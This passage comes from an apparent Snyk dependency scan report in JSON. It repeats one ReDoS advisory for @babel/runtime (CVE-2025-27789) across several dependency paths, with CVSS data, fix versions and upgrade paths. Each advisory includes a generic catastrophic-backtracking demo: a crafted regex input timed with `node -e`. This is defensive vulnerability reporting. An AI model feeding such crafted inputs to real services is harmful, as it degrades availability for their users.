        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-transition-group@4.3.0",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-transition-group@4.3.0",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-camel-case@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-camel-case@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-default-unit@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-default-unit@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
